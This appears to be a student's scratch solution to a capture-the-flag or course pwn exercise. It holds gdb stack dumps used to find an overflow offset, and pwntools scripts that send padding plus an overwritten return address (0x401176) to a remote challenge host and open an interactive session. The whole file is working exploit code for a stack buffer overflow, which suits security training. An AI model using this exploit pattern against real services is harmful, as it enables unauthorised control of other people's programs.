import struct
import binascii

# base = 'A' * 23
# to = struct.pack("<Q", 0x0000000000401176)
# out = base+str(to)
# print(out)
# print(base)
# print(to)

# AAAAAAAAAAAAAAAAAAAAAAAb'v\x11@\x00\x00\x00\x00\x00'
# AAAAAAAAAAAAAAAAAAAAAAA\x11@\x00\x00\x00\x00\x00
# AAAAAAAAAAAAAAAAAAAAAAA\x11\x00\x00\x00\x00\x00
# AAAAAAAAAAAAAAAAAAAAAAA\x76\x11\x40\x00\x00\x00\x00\x00
# BBBBBBBBBBBBBBBBBBBBBBB\x76\x11\x40\x00\x00\x00\x00\x00
'''
Stack level 0, frame at 0x7ffffffee0f8:
 rip = 0x401271 in main; saved rip = 0x5c3131785c363778
 Arglist at 0x5c42424242424242, args:
 Locals at 0x5c42424242424242, Previous frame's sp is 0x7ffffffee100
 Saved registers:
  rip at 0x7ffffffee0f8
'''
# BBBBBBBBBBBBBBBB\x76\x11\x40\x00\x00\x00\x00\x00


# BBBBBBBBBBBBBBBB\x76\x11\x40\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAA
# BBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZ
'''
Stack level 0, frame at 0x7ffffffee0f8:
 rip = 0x401271 in main; saved rip = 0x51504f4e4d4c4b4a
 Arglist at 0x4948474645444342, args:
 Locals at 0x4948474645444342, Previous frame's sp is 0x7ffffffee100
 Saved registers:
  rip at 0x7ffffffee0f8
'''
# dump arg rip
# AAAAAAAAAAAAAAAA BCDEFGHI JKLMNOPQ 
# AAAAAAAAAAAAAAAA\x76\x11\x40\x00\x00\x00\x00\x00\x76\x11\x40\x00\x00\x00\x00\x00

# print()
# run $(python -c 'print 'AAAAAAAAAAAAAAAA' + '\x76\x11\x40\x00\x00\x00\x00\x00' + '\x76\x11\x40\x00\x00\x00\x00\x00')
print('AAAAAAAAAAAAAAAA' + '\x76\x11\x40\x00\x00\x00\x00\x00' + '\x76\x11\x40\x00\x00\x00\x00\x00')
# run $(python -c 'print('AAAAAAAAAAAAAAAA' + '\x76\x11\x40\x00\x00\x00\x00\x00' + '\x76\x11\x40\x00\x00\x00\x00\x00')'
print(binascii.a2b_hex('76'))
print(binascii.a2b_hex('11'))
print(binascii.a2b_hex('40'))
print(binascii.a2b_hex('00'))
print(binascii.a2b_hex('00'))
print(binascii.a2b_hex('00'))
print(binascii.a2b_hex('00'))
print(binascii.a2b_hex('00'))

base = b'A' * 16
to = struct.pack("<Q", 0x0000000000401176)
out = base+to+to
print(out)
print(base)
print(to)

# AAAAAAAAAAAAAAAAv\x11@\x00\x00\x00\x00\x00v\x11@\x00\x00\x00\x00\x00\

#!/usr/bin/env python
# coding=utf-8
from pwn import *

context(arch = 'i386', os = 'linux')

r = remote('hw00.zoolab.org', 65534)
# EXPLOIT CODE GOES HERE
# r.send(asm(shellcraft.sh()))
targer_address = p64(0x0000000000401176)
args = p64(0xCAFECAFECAFECAFE)

r.sendline(b'A' * 16 + args + targer_address)
r.interactive()


#!/usr/bin/env python
# coding=utf-8
from pwn import *

# context(os = 'linux')

r = remote('hw00.zoolab.org', 65534)
# EXPLOIT CODE GOES HERE
# r.send(asm(shellcraft.sh()))
targer_address = p64(0x0000000000401176)

# ps64 = make_packer(64, 'little', 'signed')

args = p64(0xCAFECAFECAFECAFE)

r.sendline(args * 3 + targer_address)
# r.recvline()
r.interactive()
